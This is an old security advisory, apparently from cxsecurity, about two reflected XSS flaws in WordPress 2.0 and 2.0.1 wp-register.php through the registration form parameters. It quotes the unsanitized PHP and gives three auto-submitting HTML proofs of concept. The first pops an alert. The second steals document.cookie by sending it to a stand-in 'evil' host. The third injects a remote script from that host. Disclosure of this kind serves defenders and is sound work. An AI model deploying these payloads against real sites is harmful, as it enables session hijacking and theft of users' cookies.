|  |  | | **2 vanilla XSS on Wordpress "wp-register.php"** **2007.09.27** Credit:  **[Adrian P](https://cxsecurity.com/author/Adrian%2BP/1/)**  Risk: **Low** Local: **No** Remote: ****Yes**** CVE: **[CVE-2007-5105](https://cxsecurity.com/cveshow/CVE-2007-5105/ "Click to see CVE-2007-5105")** | **[CVE-2007-5106](https://cxsecurity.com/cveshow/CVE-2007-5106/ "Click to see CVE-2007-5106")** CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | | --- | |

There are two vanilla XSS on &#8216;wp-register.php&#8217;. Only early versions of
the 2.0 branch are affected.
Version 2.0 is vulnerable through the &#8216;user\_login&#8217; and &#8216;user\_email&#8217; parameters.
Version 2.0.1 filters the &#8216;user\_login&#8217; parameter but is still
vulnerable through the &#8216;user\_email&#8217; parameter (half-baked fix?).
The XSS is only exploitable through a &#8216;POST&#8217; request.
WordPress 2.0.4 is not vulnerable, so I&#8217;m assuming anything after this
is not vulnerable either (unless there is a comeback of course).
Note: user registration is disabled by default. Only sites with &#8216;user
registration&#8217; enabled are affected.
line 16 and 17 on version 2.0.1 :
$user\_login = sanitize\_user( $\_POST[&#8217;user\_login&#8217;] );
$user\_email = $\_POST[&#8217;user\_email&#8217;];
we can notice that &#8216;user\_login&#8217; is sanitized but &#8216;user\_email&#8217; is not
and eventually gets printed without further filtering on line 114:
<?php echo $user\_email; ?>
I contacted the vendor and asked them if these issues had been fixed
silently since I couldn&#8217;t find them documented anywhere (even though
they had been fixed from version 2.0.4 on). However, I got NO response
from the vendor whatsoever.
simple PoC:
<html>
<head></head>
<body>
<form method="post" action="http://target/wordpress/wp-register.php" >
<input type="hidden" name="action" value="register" />
<input type="hidden" name="user\_login" id="user\_login"
value=&apos;"><script>alert(1)</script>&apos; />
<input type="hidden" name="user\_email" id="user\_email"
value=&apos;"><script>alert(2)</script>&apos; />
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
will popup &#8216;1&#8242; and &#8216;2&#8242; on version 2.0, and only &#8216;2&#8242; on version 2.0.1.
cookie theft PoC:
<html>
<head></head>
<body>
<form method="post"
action="http://target/wordpress/wp-register.php#location=&apos;http://evil/?&apos;+document.cookie"
>
<input type="hidden" name="action" value="register" />
<input type="hidden" name="user\_login" id="user\_login" value="anyusername" />
<input type="hidden" name="user\_email" id="user\_email"
value=&apos;"><script>eval(location.hash.substr(1))</script>&apos; />
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
unrestricted script insertion from third-party site
(we prove we can
inject ANY JS):
<html>
<head></head>
<body>
<form method="post" action="http://victim/wordpress/wp-register.php" >
<input type="hidden" name="action" value="register" />
<input type="hidden" name="user\_login" id="user\_login" value="test" />
<input type="hidden" name="user\_email" id="user\_email"
value=&apos;"><SCRIPT src=http://evil/jsfile></SCRIPT>&apos;>
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
